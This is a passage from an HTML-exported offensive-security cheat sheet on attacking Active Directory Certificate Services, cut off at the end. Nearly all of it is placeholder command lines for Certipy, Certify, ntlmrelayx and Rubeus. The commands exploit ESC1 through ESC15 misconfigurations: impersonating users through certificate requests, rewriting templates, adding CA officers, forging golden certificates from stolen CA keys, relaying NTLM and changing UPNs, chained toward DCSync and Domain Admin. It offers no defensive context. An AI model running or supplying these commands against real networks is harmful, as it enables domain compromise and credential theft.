Template</h1><br/><p># ADCS</p><p></p><p>## Misconfigured Certificate Template<ul><li>ESC1 &gt;&gt;&gt; Pass the certificate [<a href="#Domain_Dominance--Lateral_Movement--Certificate_(pfx)--Pass_the_certificate_1251.html">Pass the certificate</a>]</li></ul></p><p>  - `certipy req -u &lt;user&gt;@&lt;domain&gt; -p &lt;password&gt; -target &lt;ca_server&gt; -template &#39;&lt;vulnerable template name&gt;&#39;  -ca &lt;ca_name&gt; -upn &lt;target_user&gt;@&lt;domain&gt;`</p><p>  - `certify.exe request /ca:&lt;server&gt;\&lt;ca-name&gt;   /template:&quot;&lt;vulnerable template name&gt;&quot; [/altname:&quot;Admin&quot;]`<ul><li>ESC2 &gt;&gt;&gt; ESC3 [<a href="#Domain_Dominance--ADCS--Misconfigured_Certificate_Template--ESC3_1204.html">ESC3</a>]</li><li>ESC3</li></ul></p><p>  - `certify.exe request /ca:&lt;server&gt;\&lt;ca-name&gt; /template:&quot;&lt;vulnerable template name&gt;&quot;`</p><p>    - `certify.exe request request /ca:&lt;server&gt;\&lt;ca-name&gt; /template:&lt;template&gt;  /onbehalfof:&lt;domain&gt;\&lt;user&gt; /enrollcert:&lt;path.pfx&gt; [/enrollcertpw:&lt;cert-password&gt;]`</p><p>  - `certipy req -u &lt;user&gt;@&lt;domain&gt; -p &lt;password&gt; -target &lt;ca_server&gt; -template &#39;&lt;vulnerable template name&gt;&#39;  -ca &lt;ca_name&gt;`</p><p>    - `certipy req -u &lt;user&gt;@&lt;domain&gt; -p &lt;password&gt; -target &lt;ca_server&gt; -template  &#39;&lt;vulnerable template name&gt;&#39;  -ca &lt;ca_name&gt; -on-behalf-of &#39;&lt;domain&gt;\&lt;user&gt;&#39; -pfx &lt;cert&gt;`<ul><li>ESC13 &gt;&gt;&gt; Pass The Certificate (PKINIT) [<a href="#Domain_Dominance--Lateral_Movement--Certificate_(pfx)--Pass_the_certificate--pkinit_1252.html">pkinit</a>]</li></ul></p><p>  - `certipy req -u &lt;user&gt;@&lt;domain&gt; -p &lt;password&gt; -target &lt;ca_server&gt;  -template &#39;&lt;vulnerable template name&gt;&#39; -ca &lt;ca_name&gt;`</p><p>  - `certify.exe request /ca:&lt;server&gt;\&lt;ca-name&gt; /template:&quot;&lt;vulnerable template name&gt;&quot;`<ul><li>ESC15</li></ul></p><p>  - `certipy req -u &lt;user&gt;@&lt;domain&gt; -p &lt;password&gt; -target &lt;ca_server&gt; -template &#39;&lt;version 1 template with enrolee flag&gt;&#39; -ca &lt;ca_name&gt; -upn &lt;target_user&gt;@&lt;domain&gt; --application-policies &#39;Client Authentication&#39; #[PR 228]` &gt;&gt;&gt; Pass the certificate (only Schannel) [<a href="#Domain_Dominance--Lateral_Movement--Certificate_(pfx)--Pass_the_certificate--schannel_1253.html">schannel</a>]</p><p>  - `certipy req -u &lt;user&gt;@&lt;domain&gt; -p &lt;password&gt; -target &lt;ca_server&gt; -template &#39;&lt;version 1 template with enrolee flag&gt;&#39; -ca &lt;ca_name&gt; --application-policies &#39;Certificate Request Agent&#39; # [PR 228]` &gt;&gt;&gt; Pass the certificate [<a href="#Domain_Dominance--Lateral_Movement--Certificate_(pfx)--Pass_the_certificate_1251.html">Pass the certificate</a>]</p><p>    - `certipy req -u &lt;user&gt;@&lt;domain&gt; -p &lt;password&gt; -target &lt;ca_server&gt; -template &#39;&lt;vulnerable template name&gt;&#39; -ca &lt;ca_name&gt; -on-behalf-of &#39;&lt;domain&gt;\&lt;user&gt;&#39; -pfx &lt;cert&gt;`</p></div><div class='page'><a name="Domain_Dominance--ADCS--Misconfigured_Certificate_Template--ESC1_1202.html"></a><h1 class='title level-4'>ESC1</h1><br/><p># ADCS</p><p>## Misconfigured Certificate Template</p><p>### ESC1 &gt;&gt;&gt; Pass the certificate [<a href="#Domain_Dominance--Lateral_Movement--Certificate_(pfx)--Pass_the_certificate_1251.html">Pass the certificate</a>]</p><p></p><p>certipy req -u &lt;user&gt;@&lt;domain&gt; -p &lt;password&gt; -target &lt;ca_server&gt; -template &#39;&lt;vulnerable template name&gt;&#39;  -ca &lt;ca_name&gt; -upn &lt;target_user&gt;@&lt;domain&gt;</p><p></p><p>certify.exe request /ca:&lt;server&gt;\&lt;ca-name&gt;   /template:&quot;&lt;vulnerable template name&gt;&quot; [/altname:&quot;Admin&quot;]</p></div><div class='page'><a name="Domain_Dominance--ADCS--Misconfigured_Certificate_Template--ESC2_1203.html"></a><h1 class='title level-4'>ESC2</h1><br/><p># ADCS</p><p>## Misconfigured Certificate Template</p><p>### ESC2 &gt;&gt;&gt; ESC3 [<a href="#Domain_Dominance--ADCS--Misconfigured_Certificate_Template--ESC3_1204.html">ESC3</a>]</p></div><div class='page'><a name="Domain_Dominance--ADCS--Misconfigured_Certificate_Template--ESC3_1204.html"></a><h1 class='title level-4'>ESC3</h1><br/><p># ADCS</p><p>## Misconfigured Certificate Template</p><p>### ESC3</p><p></p><p>certify.exe request /ca:&lt;server&gt;\&lt;ca-name&gt; /template:&quot;&lt;vulnerable template name&gt;&quot;</p><p>&gt;&gt;	certify.exe request request /ca:&lt;server&gt;\&lt;ca-name&gt; /template:&lt;template&gt;  /onbehalfof:&lt;domain&gt;\&lt;user&gt; /enrollcert:&lt;path.pfx&gt; [/enrollcertpw:&lt;cert-password&gt;]</p><p></p><p>certipy req -u &lt;user&gt;@&lt;domain&gt; -p &lt;password&gt; -target &lt;ca_server&gt; -template &#39;&lt;vulnerable template name&gt;&#39;  -ca &lt;ca_name&gt;</p><p>&gt;&gt;	certipy req -u &lt;user&gt;@&lt;domain&gt; -p &lt;password&gt; -target &lt;ca_server&gt; -template  &#39;&lt;vulnerable template name&gt;&#39;  -ca &lt;ca_name&gt; -on-behalf-of &#39;&lt;domain&gt;\&lt;user&gt;&#39; -pfx &lt;cert&gt;</p></div><div class='page'><a name="Domain_Dominance--ADCS--Misconfigured_Certificate_Template--ESC13_1205.html"></a><h1 class='title level-4'>ESC13</h1><br/><p># ADCS</p><p>## Misconfigured Certificate Template</p><p>### ESC13 &gt;&gt;&gt; Pass The Certificate (PKINIT) [<a href="#Domain_Dominance--Lateral_Movement--Certificate_(pfx)--Pass_the_certificate--pkinit_1252.html">pkinit</a>]</p><p></p><p>certipy req -u &lt;user&gt;@&lt;domain&gt; -p &lt;password&gt; -target &lt;ca_server&gt;  -template &#39;&lt;vulnerable template name&gt;&#39; -ca &lt;ca_name&gt;</p><p></p><p>certify.exe request /ca:&lt;server&gt;\&lt;ca-name&gt; /template:&quot;&lt;vulnerable template name&gt;&quot;</p></div><div class='page'><a name="Domain_Dominance--ADCS--Misconfigured_Certificate_Template--ESC15_1206.html"></a><h1 class='title level-4'>ESC15</h1><br/><p># ADCS</p><p>## Misconfigured Certificate Template</p><p>### ESC15</p><p></p><p>certipy req -u &lt;user&gt;@&lt;domain&gt; -p &lt;password&gt; -target &lt;ca_server&gt; -template &#39;&lt;version 1 template with enrolee flag&gt;&#39; -ca &lt;ca_name&gt; -upn &lt;target_user&gt;@&lt;domain&gt; --application-policies &#39;Client Authentication&#39; #[PR 228] &gt;&gt;&gt; Pass the certificate (only Schannel) [<a href="#Domain_Dominance--Lateral_Movement--Certificate_(pfx)--Pass_the_certificate--schannel_1253.html">schannel</a>]</p><p> </p><p>certipy req -u &lt;user&gt;@&lt;domain&gt; -p &lt;password&gt; -target &lt;ca_server&gt; -template &#39;&lt;version 1 template with enrolee flag&gt;&#39; -ca &lt;ca_name&gt; --application-policies &#39;Certificate Request Agent&#39; # [PR 228]</p><p>&gt;&gt;	certipy req -u &lt;user&gt;@&lt;domain&gt; -p &lt;password&gt; -target &lt;ca_server&gt; -template &#39;&lt;vulnerable template name&gt;&#39; -ca &lt;ca_name&gt; -on-behalf-of &#39;&lt;domain&gt;\&lt;user&gt;&#39; -pfx &lt;cert&gt; &gt;&gt;&gt; Pass the certificate [<a href="#Domain_Dominance--Lateral_Movement--Certificate_(pfx)--Pass_the_certificate_1251.html">Pass the certificate</a>]</p></div><div class='page'><a name="Domain_Dominance--ADCS--Misconfigured_ACL_1063.html"></a><h1 class='title level-3'>Misconfigured ACL</h1><br/><p># ADCS</p><p>## Misconfigured ACL<ul><li>ESC4</li></ul></p><p>  - write privilege over a certificate template</p><p>    - `certipy template -u &lt;user&gt;@&lt;domain&gt; -p &#39;&lt;password&gt;&#39; -template &lt;vuln_template&gt; -save-old -debug` &gt;&gt;&gt; ESC1 [<a href="#Domain_Dominance--ADCS--Misconfigured_Certificate_Template--ESC1_1202.html">ESC1</a>]</p><p>    - restore template<ul><li>`certipy template -u &lt;user&gt;@&lt;domain&gt; -p &#39;&lt;password&gt;&#39; -template &lt;vuln_template&gt; -configuration &lt;template&gt;.json`</li></ul></p><p><ul><li>ESC7</li></ul></p><p>  - Manage CA</p><p>    - `certipy ca -ca &lt;ca_name&gt; -add-officer  &#39;&lt;user&gt;&#39; -username &lt;user&gt;@&lt;domain&gt; -password &lt;password&gt; -dc-ip &lt;dc_ip&gt; -target-ip &lt;target_ip&gt;` &gt;&gt;&gt; ESC7 Manage certificate [<a href="#Domain_Dominance--ADCS--Misconfigured_ACL--ESC7--Manage_certificate_1210.html">Manage certificate</a>]</p><p>  - Manage certificate</p><p>    - `certipy ca  -ca &lt;ca_name&gt; -enable-template &#39;&lt;ecs1_vuln_template&gt;&#39; -username &lt;user&gt;@&lt;domain&gt; -password &lt;password&gt;`<ul><li>`certipy  req -username &lt;user&gt;@&lt;domain&gt; -password &lt;password&gt; -ca &lt;ca_name&gt; -template &#39;&lt;vulnerable template name&gt;&#39; -upn &#39;&lt;target_user&gt;&#39;`</li></ul></p><p>        - error, but save private key and get issue request</p><p>    - Issue request<ul><li>`certipy ca -u &lt;user&gt;@&lt;domain&gt; -p &#39;&lt;password&gt;&#39; -ca &lt;ca_name&gt; -issue-request &lt;request_id&gt;`</li></ul></p><p>        - `certipy req -u &lt;user&gt;@&lt;domain&gt; -p &#39;&lt;password&gt;&#39;  -ca &lt;ca_name&gt; -retreive &lt;request_id&gt;` &gt;&gt;&gt; Pass the certificate [<a href="#Domain_Dominance--Lateral_Movement--Certificate_(pfx)--Pass_the_certificate_1251.html">Pass the certificate</a>]</p></div><div class='page'><a name="Domain_Dominance--ADCS--Misconfigured_ACL--ESC4_1207.html"></a><h1 class='title level-4'>ESC4</h1><br/><p># ADCS</p><p>## Misconfigured ACL</p><p>### ESC4</p><p></p><p>Write privilege over a certificate template</p><p>&gt;&gt;	certipy template -u &lt;user&gt;@&lt;domain&gt; -p &#39;&lt;password&gt;&#39; -template &lt;vuln_template&gt; -save-old -debug &gt;&gt;&gt; ESC1 [<a href="#Domain_Dominance--ADCS--Misconfigured_Certificate_Template--ESC1_1202.html">ESC1</a>]</p><p>&gt;&gt;	restore template</p><p>	&gt;&gt;	certipy template -u &lt;user&gt;@&lt;domain&gt; -p &#39;&lt;password&gt;&#39; -template &lt;vuln_template&gt; -configuration &lt;template&gt;.json</p></div><div class='page'><a name="Domain_Dominance--ADCS--Misconfigured_ACL--ESC7_1208.html"></a><h1 class='title level-4'>ESC7</h1><br/><p># ADCS</p><p>## Misconfigured ACL</p><p>### ESC7</p><p></p><p>  - Manage CA</p><p>    - `certipy ca -ca &lt;ca_name&gt; -add-officer  &#39;&lt;user&gt;&#39; -username &lt;user&gt;@&lt;domain&gt; -password &lt;password&gt; -dc-ip &lt;dc_ip&gt; -target-ip &lt;target_ip&gt;` &gt;&gt;&gt; ESC7 Manage certificate [<a href="#Domain_Dominance--ADCS--Misconfigured_ACL--ESC7--Manage_certificate_1210.html">Manage certificate</a>]</p><p>  - Manage certificate</p><p>    - `certipy ca  -ca &lt;ca_name&gt; -enable-template &#39;&lt;ecs1_vuln_template&gt;&#39; -username &lt;user&gt;@&lt;domain&gt; -password &lt;password&gt;`<ul><li>`certipy  req -username &lt;user&gt;@&lt;domain&gt; -password &lt;password&gt; -ca &lt;ca_name&gt; -template &#39;&lt;vulnerable template name&gt;&#39; -upn &#39;&lt;target_user&gt;&#39;`</li></ul></p><p>        - error, but save private key and get issue request</p><p>    - Issue request<ul><li>`certipy ca -u &lt;user&gt;@&lt;domain&gt; -p &#39;&lt;password&gt;&#39; -ca &lt;ca_name&gt; -issue-request &lt;request_id&gt;`</li></ul></p><p>        - `certipy req -u &lt;user&gt;@&lt;domain&gt; -p &#39;&lt;password&gt;&#39;  -ca &lt;ca_name&gt; -retreive &lt;request_id&gt;` &gt;&gt;&gt; Pass the certificate [<a href="#Domain_Dominance--Lateral_Movement--Certificate_(pfx)--Pass_the_certificate_1251.html">Pass the certificate</a>]</p></div><div class='page'><a name="Domain_Dominance--ADCS--Misconfigured_ACL--ESC7--Manage_CA_1209.html"></a><h1 class='title level-5'>Manage CA</h1><br/><p># ADCS</p><p>## Misconfigured ACL</p><p>### ESC7</p><p>#### Manage CA</p><p></p><p>certipy ca -ca &lt;ca_name&gt; -add-officer  &#39;&lt;user&gt;&#39; -username &lt;user&gt;@&lt;domain&gt; -password &lt;password&gt; -dc-ip &lt;dc_ip&gt; -target-ip &lt;target_ip&gt; &gt;&gt;&gt; ESC7 Manage certificate [<a href="#Domain_Dominance--ADCS--Misconfigured_ACL--ESC7--Manage_certificate_1210.html">Manage certificate</a>]</p></div><div class='page'><a name="Domain_Dominance--ADCS--Misconfigured_ACL--ESC7--Manage_certificate_1210.html"></a><h1 class='title level-5'>Manage certificate</h1><br/><p># ADCS</p><p>## Misconfigured ACL</p><p>### ESC7</p><p>#### Manage certificate</p><p></p><p>certipy ca  -ca &lt;ca_name&gt; -enable-template &#39;&lt;ecs1_vuln_template&gt;&#39; -username &lt;user&gt;@&lt;domain&gt; -password &lt;password&gt;</p><p>&gt;&gt;	certipy  req -username &lt;user&gt;@&lt;domain&gt; -password &lt;password&gt; -ca &lt;ca_name&gt; -template &#39;&lt;vulnerable template name&gt;&#39; -upn &#39;&lt;target_user&gt;&#39;</p><p>	&gt;&gt;	error, but save private key and get issue request</p><p></p><p>Issue request</p><p>&gt;&gt;	certipy ca -u &lt;user&gt;@&lt;domain&gt; -p &#39;&lt;password&gt;&#39; -ca &lt;ca_name&gt; -issue-request &lt;request_id&gt;</p><p>	&gt;&gt;	certipy req -u &lt;user&gt;@&lt;domain&gt; -p &#39;&lt;password&gt;&#39;  -ca &lt;ca_name&gt; -retreive &lt;request_id&gt; &gt;&gt;&gt; Pass the certificate [<a href="#Domain_Dominance--Lateral_Movement--Certificate_(pfx)--Pass_the_certificate_1251.html">Pass the certificate</a>]</p></div><div class='page'><a name="Domain_Dominance--ADCS--Vulnerable_PKI_Object_access_control_1064.html"></a><h1 class='title level-3'>Vulnerable PKI Object access control</h1><br/><p># ADCS</p><p>## Vulnerable PKI Object access control</p><p>### ESC5</p><p></p><p>  - Vulnerable acl on PKI &gt;&gt;&gt; ACL [<a href="#Domain_Dominance--ACLs-ACEs_Permissions_974.html">ACLs/ACEs Permissions</a>]</p><p>  - Golden certificate </p><p>    - `certipy ca -backup -u &lt;user&gt;@&lt;domain&gt; -hashes &lt;hash_nt&gt; -ca &lt;ca_name&gt; -debug -target &lt;ca_ip&gt;<ul><li>`certipy forge -ca-pfx &#39;&lt;adcs&gt;.pfx&#39; -upn administrator@&lt;domain&gt; &gt;&gt;&gt; Pass the certificate [<a href="#Domain_Dominance--Lateral_Movement--Certificate_(pfx)--Pass_the_certificate_1251.html">Pass the certificate</a>]</p><p></li></ul></p></div><div class='page'><a name="Domain_Dominance--ADCS--Vulnerable_PKI_Object_access_control--Vulnerable_acl_on_PKI__ACL_1211.html"></a><h1 class='title level-4'>Vulnerable acl on PKI >>> ACL</h1><br/><p># ADCS</p><p>## Vulnerable PKI Object access control</p><p>### ESC5</p><p>#### Vulnerable acl on PKI &gt;&gt;&gt; ACL [<a href="#Domain_Dominance--ACLs-ACEs_Permissions_974.html">ACLs/ACEs Permissions</a>]</p></div><div class='page'><a name="Domain_Dominance--ADCS--Vulnerable_PKI_Object_access_control--Golden_certificate_1212.html"></a><h1 class='title level-4'>Golden certificate</h1><br/><p># ADCS</p><p>## Vulnerable PKI Object access control</p><p>### ESC5</p><p>#### Golden certificate </p><p></p><p>certipy ca -backup -u &lt;user&gt;@&lt;domain&gt; -hashes &lt;hash_nt&gt; -ca &lt;ca_name&gt; -debug -target &lt;ca_ip&gt;</p><p>&gt;&gt;	certipy forge -ca-pfx &#39;&lt;adcs&gt;.pfx&#39; -upn administrator@&lt;domain&gt; &gt;&gt;&gt; Pass the certificate [<a href="#Domain_Dominance--Lateral_Movement--Certificate_(pfx)--Pass_the_certificate_1251.html">Pass the certificate</a>]</p></div><div class='page'><a name="Domain_Dominance--ADCS--Misconfigured_Certificate_Authority_1065.html"></a><h1 class='title level-3'>Misconfigured Certificate Authority</h1><br/><p># ADCS</p><p></p><p>## Misconfigured Certificate Authority</p><p><ul><li>ESC6 @CVE@ &gt;&gt;&gt; ESC1 [<a href="#Domain_Dominance--ADCS--Misconfigured_Certificate_Template--ESC1_1202.html">ESC1</a>]</li></ul></p><p>  - Abuse ATTRIBUTESUBJECTALTNAME2 flag set on CA you can choose any certificate template that permits client authentication</p><p><ul><li>ESC11 &gt;&gt;&gt; Pass the ticket [<a href="#Domain_Dominance--Lateral_Movement--Kerberos--Pass_the_Ticket_(ccache_-_kirbi)_1248.html">Pass the Ticket (ccache / kirbi)</a>] &gt;&gt;&gt; DCSYNC [<a href="#Domain_Dominance--ACLs-ACEs_Permissions--Dcsync_1044.html">Dcsync</a>] &gt;&gt;&gt; Domain Admin [<a href="#Domain_Dominance--Domain_Admin_980.html">Domain Admin</a>]</li></ul></p><p>  - `ntlmrelayx.py -t rpc://&lt;ca_ip&gt; -smb2support -rpc-mode ICPR -icpr-ca-name &lt;ca_name&gt;` </p><p>    - `Rubeus.exe asktgt /user:&lt;user&gt; /certificate:&lt;base64-certificate&gt; /ptt`</p><p>    - `gettgtpkinit.py -pfx-base64 $(cat cert.b64) &lt;domain&gt;/&lt;dc_name&gt;$ &lt;ccache_file&gt;`</p><p>  - `certipy relay -target rpc://&lt;ip_ca&gt; -ca &#39;&lt;ca_name&gt;&#39;`</p><p>    - `certipy auth -pfx &lt;certificate&gt; -dc-ip &lt;dc_ip&gt;`</p></div><div class='page'><a name="Domain_Dominance--ADCS--Misconfigured_Certificate_Authority--ESC6_1213.html"></a><h1 class='title level-4'>ESC6</h1><br/><p># ADCS</p><p>## Misconfigured Certificate Authority</p><p>### ESC6 @CVE@ &gt;&gt;&gt; ESC1 [<a href="#Domain_Dominance--ADCS--Misconfigured_Certificate_Template--ESC1_1202.html">ESC1</a>]</p><p></p><p>Abuse ATTRIBUTESUBJECTALTNAME2 flag set on CA you can choose any certificate template that permits client authentication &gt;&gt;&gt; ESC1 [<a href="#Domain_Dominance--ADCS--Misconfigured_Certificate_Template--ESC1_1202.html">ESC1</a>]</p></div><div class='page'><a name="Domain_Dominance--ADCS--Misconfigured_Certificate_Authority--ESC11_1214.html"></a><h1 class='title level-4'>ESC11</h1><br/><p># ADCS</p><p>## Misconfigured Certificate Authority</p><p>### ESC11 &gt;&gt;&gt; Pass the ticket [<a href="#Domain_Dominance--Lateral_Movement--Kerberos--Pass_the_Ticket_(ccache_-_kirbi)_1248.html">Pass the Ticket (ccache / kirbi)</a>] &gt;&gt;&gt; DCSYNC [<a href="#Domain_Dominance--ACLs-ACEs_Permissions--Dcsync_1044.html">Dcsync</a>] &gt;&gt;&gt; Domain Admin [<a href="#Domain_Dominance--Domain_Admin_980.html">Domain Admin</a>]</p><p></p><p>ntlmrelayx.py -t rpc://&lt;ca_ip&gt; -smb2support -rpc-mode ICPR -icpr-ca-name &lt;ca_name&gt;</p><p>&gt;&gt;	Rubeus.exe asktgt /user:&lt;user&gt; /certificate:&lt;base64-certificate&gt; /ptt</p><p>&gt;&gt;	gettgtpkinit.py -pfx-base64 $(cat cert.b64) &lt;domain&gt;/&lt;dc_name&gt;$ &lt;ccache_file&gt;</p><p></p><p>certipy relay -target rpc://&lt;ip_ca&gt; -ca &#39;&lt;ca_name&gt;&#39;</p><p>&gt;&gt;	certipy auth -pfx &lt;certificate&gt; -dc-ip &lt;dc_ip&gt;</p></div><div class='page'><a name="Domain_Dominance--ADCS--Abuse_Certificate_Mapping_1066.html"></a><h1 class='title level-3'>Abuse Certificate Mapping</h1><br/><p># ADCS</p><p></p><p>## Abuse Certificate Mapping</p><p><ul><li>ESC9/ESC10 (implicit)</li></ul></p><p>  - `certipy shadow auto -username &lt;accountA&gt;@&lt;domain&gt; -p &lt;passA&gt; -account &lt;accountB&gt;`</p><p>    - ESC9/ESC10 (Case 1)<ul><li>`certipy account update -username &lt;accountA&gt;@&lt;domain&gt; -password &lt;passA&gt; -user &lt;accountB&gt; -upn Administrator` &gt;&gt;&gt; reset accountB UPN [<a href="#Domain_Dominance--ADCS--Abuse_Certificate_Mapping--ESC9-ESC10_(implicit)--ESC9-ESC10_(Case_1)--reset_accountB_UPN_1221.html">reset accountB UPN</a>]</li></ul></p><p>        - ESC9</p><p>          - `certipy req  -username &lt;accountB&gt;@&lt;domain&gt; -hashes &lt;hashB&gt; -ca &lt;ca_name&gt; -template &lt;vulnerable template&gt;`</p><p>        - ESC10 (case 1)</p><p>          - `certipy req  -username &lt;accountB&gt;@&lt;domain&gt; -hashes &lt;hashB&gt; -ca &lt;ca_name&gt; -template &lt;any template with client auth&gt;`</p><p>    - ESC10 (Case 2)<ul><li>`certipy account update -username &lt;accountA&gt;@&lt;domain&gt; -password &lt;passA&gt; -user &lt;accountB&gt; -upn &#39;&lt;dc_name$&gt;@&lt;domain&gt;&#39;` &gt;&gt;&gt; ESC10  Case1 [<a href="#Domain_Dominance--ADCS--Abuse_Certificate_Mapping--ESC9-ESC10_(implicit)--ESC9-ESC10_(Case_1)--ESC10_(Case_1)_1220.html">ESC10 (Case 1)</a>]</li></ul></p><p>  - reset accountB UPN</p><p>    - `certipy account update -username &lt;accountA&gt;@&lt;domain&gt; -password &lt;passA&gt; -user &lt;accountB&gt; -upn &lt;accountB&gt;@&lt;domain&gt;` &gt;&gt;&gt; Pass The Certificate [<a href="#Domain_Dominance--Lateral_Movement--Certificate_(pfx)--Pass_the_certificate_1251.html">Pass the certificate</a>]<ul><li>[Kerberos Mapping] ESC9/ESC10(Case 1)</li><li>[Schannel Mapping] ESC9/ESC10 (Case 2)</li></ul></p><p><ul><li>ESC14 (explicit)</p><p></li></ul></p></div><div class='page'><a name="Domain_Dominance--ADCS--Abuse_Certificate_Mapping--ESC9-ESC10_(implicit)_1215.html"></a><h1 class='title level-4'>ESC9/ESC10 (implicit)</h1><br/><p># ADCS</p><p></p><p>## Abuse Certificate Mapping</p><p><ul><li>ESC9/ESC10 (implicit)</li></ul></p><p>  - `certipy shadow auto -username &lt;accountA&gt;@&lt;domain&gt; -p &lt;passA&gt; -account &lt;accountB&gt;`</p><p>    - ESC9/ESC10 (Case 1)<ul><li>`certipy account update -username &lt;accountA&gt;@&lt;domain&gt; -password &lt;passA&gt; -user &lt;accountB&gt; -upn Administrator` &gt;&gt;&gt; reset accountB UPN [<a href="#Domain_Dominance--ADCS--Abuse_Certificate_Mapping--ESC9-ESC10_(implicit)--ESC9-ESC10_(Case_1)--reset_accountB_UPN_1221.html">reset accountB UPN</a>]</li></ul></p><p>        - ESC9</p><p>          - `certipy req  -username &lt;accountB&gt;@&lt;domain&gt; -hashes &lt;hashB&gt; -ca &lt;ca_name&gt; -template &lt;vulnerable template&gt;`</p><p>        - ESC10 (case 1)</p><p>          - `certipy req  -username &lt;accountB&gt;@&lt;domain&gt; -hashes &lt;hashB&gt; -ca &lt;ca_name&gt; -template &lt;any template with client auth&gt;`</p><p>    - ESC10 (Case 2)<ul><li>`certipy account update -username &lt;accountA&gt;@&lt;domain&gt; -password &lt;passA&gt; -user &lt;accountB&gt; -upn &#39;&lt;dc_name$&gt;@&lt;domain&gt;&#39;` &gt;&gt;&gt; ESC10  Case1 [<a href="#Domain_Dominance--ADCS--Abuse_Certificate_Mapping--ESC9-ESC10_(implicit)--ESC9-ESC10_(Case_1)--ESC10_(Case_1)_1220.html">ESC10 (Case 1)</a>]</li></ul></p><p></p><p>reset accountB UPN</p><p>&gt;&gt;	certipy account update -username &lt;accountA&gt;@&lt;domain&gt; -password &lt;passA&gt; -user &lt;accountB&gt; -upn &lt;accountB&gt;@&lt;domain&gt; </p><p>    &gt;&gt;	[Kerberos Mapping] ESC9/ESC10(Case 1) &gt;&gt;&gt; Pass The Certificate [<a href="#Domain_Dominance--Lateral_Movement--Certificate_(pfx)--Pass_the_certificate_1251.html">Pass the certificate</a>]</p><p>	&gt;&gt;	[Schannel Mapping] ESC9/ESC10 (Case 2) &gt;&gt;&gt; Pass The Certificate [<a href="#Domain_Dominance--Lateral_Movement--Certificate_(pfx)--Pass_the_certificate_1251.html">Pass the certificate</a>]</p></div><div class='page'><a name="Domain_Dominance--ADCS--Abuse_Certificate_Mapping--ESC9-ESC10_(implicit)--ESC9-ESC10_(Case_1)_1217.html"></a><h1 class='title level-5'>ESC9/ESC10 (Case 1)</h1><br/><p># ADCS</p><p>## Abuse Certificate Mapping</p><p>### ESC9/ESC10 (implicit)</p><p>  - `certipy shadow auto -username &lt;accountA&gt;@&lt;domain&gt; -p &lt;passA&gt; -account &lt;accountB&gt;`</p><p>    - ESC9/ESC10 (Case 1)<ul><li>`certipy account update -username &lt;accountA&gt;@&lt;domain&gt; -password &lt;passA&gt; -user &lt;accountB&gt; -upn Administrator` &gt;&gt;&gt; reset accountB UPN [<a href="#Domain_Dominance--ADCS--Abuse_Certificate_Mapping--ESC9-ESC10_(implicit)--ESC9-ESC10_(Case_1)--reset_accountB_UPN_1221.html">reset accountB UPN</a>]</li></ul></p><p>        - ESC9</p><p>          - `certipy req  -username &lt;accountB&gt;@&lt;domain&gt; -hashes &lt;hashB&gt; -ca &lt;ca_name&gt; -template &lt;vulnerable template&gt;`</p><p>        - ESC10 (case 1)</p><p>          - `certipy req  -username &lt;accountB&gt;@&lt;domain&gt; -hashes &lt;hashB&gt; -ca &lt;ca_name&gt; -template &lt;any template with client auth&gt;`</p></div><div class='page'><a name="Domain_Dominance--ADCS--Abuse_Certificate_Mapping--ESC9-ESC10_(implicit)--ESC9-ESC10_(Case_1)--ESC9_1219.html"></a><h1 class='title level-6'>ESC9</h1><br/><p># ADCS</p><p>## Abuse Certificate Mapping</p><p>### ESC9/ESC10 (implicit)</p><p>#### ESC9</p><p></p><p>certipy req  -username &lt;accountB&gt;@&lt;domain&gt; -hashes &lt;hashB&gt; -ca &lt;ca_name&gt; -template &lt;vulnerable template&gt; &gt;&gt;&gt; reset accountB UPN [<a href="#Domain_Dominance--ADCS--Abuse_Certificate_Mapping--ESC9-ESC10_(implicit)--ESC9-ESC10_(Case_1)--reset_accountB_UPN_1221.html">reset accountB UPN</a>]</p></div><div class='page'><a name="Domain_Dominance--ADCS--Abuse_Certificate_Mapping--ESC9-ESC10_(implicit)--ESC9-ESC10_(Case_1)--ESC10_(Case_1)_1220.html"></a><h1 class='title level-6'>ESC10 (Case 1)</h1><br/><p># ADCS</p><p>## Abuse Certificate Mapping</p><p>### ESC9/ESC10 (implicit)</p><p>#### ESC10 (case 1)</p><p></p><p>certipy req  -username &lt;accountB&gt;@&lt;domain&gt; -hashes &lt;hashB&gt; -ca &lt;ca_name&gt; -template &lt;any template with client auth&gt; &gt;&gt;&gt; reset accountB UPN [<a href="#Domain_Dominance--ADCS--Abuse_Certificate_Mapping--ESC9-ESC10_(implicit)--ESC9-ESC10_(Case_1)--reset_accountB_UPN_1221.html">reset accountB UPN</a>]</p></div><div class='page'><a name="Domain_Dominance--ADCS--Abuse_Certificate_Mapping--ESC9-ESC10_(implicit)--ESC9-ESC10_(Case_1)--reset_accountB_UPN_1221.html"></a><h1 class='title level-6'>reset accountB UPN</h1><br/><p># ADCS</p><p>## Abuse Certificate Mapping</p><p>### ESC9/ESC10 (implicit)</p><p>#### Reset accountB UPN</p><p></p><p>certipy account update -username &lt;accountA&gt;@&lt;domain&gt; -password &lt;passA&gt; -user &lt;accountB&gt; -upn &lt;accountB&gt;@&lt;domain&gt; </p><p>&gt;&gt;	[Kerberos Mapping] ESC9/ESC10(Case 1) &gt;&gt;&gt; Pass The Certificate [<a href="#Domain_Dominance--Lateral_Movement--Certificate_(pfx)--Pass_the_certificate_1251.html">Pass the certificate</a>]</p><p>&gt;&gt;	[Schannel Mapping] ESC9/ESC10 (Case 2) &gt;&gt;&gt; Pass The Certificate [<a href="#Domain_Dominance--Lateral_Movement--Certificate_(pfx)--Pass_the_certificate_1251.html">Pass the certificate</a>]</p></div><div class='page'><a name="Domain_Dominance--ADCS--Abuse_Certificate_Mapping--ESC9-ESC10_(implicit)--ESC10_(Case_2)_1218.html"></a><h1 class='title level-5'>ESC10 (Case 2)</h1><br/><p># ADCS</p><p>## Abuse Certificate Mapping</p><p>### ESC9/ESC10 (implicit)</p><p>#### ESC10 (Case 2) &gt;&gt;&gt; ESC10  Case1 [<a href="#Domain_Dominance--ADCS--Abuse_Certificate_Mapping--ESC9-ESC10_(implicit)--ESC9-ESC10_(Case_1)--ESC10_(Case_1)_1220.html">ESC10 (Case 1)</a>]</p><p></p><p>certipy account update -username &lt;accountA&gt;@&lt;domain&gt; -password &lt;passA&gt; -user &lt;accountB&gt; -upn &#39;&lt;dc_name$&gt;@&lt;domain&gt;&#39; &gt;&gt;&gt; ESC10  Case1 [<a href="#Domain_Dominance--ADCS--Abuse_Certificate_Mapping--ESC9-ESC10_(implicit)--ESC9-ESC10_(Case_1)--ESC10_(Case_1)_1220.html">ESC10 (Case 1)</a>]</p></div><div class='page'><a 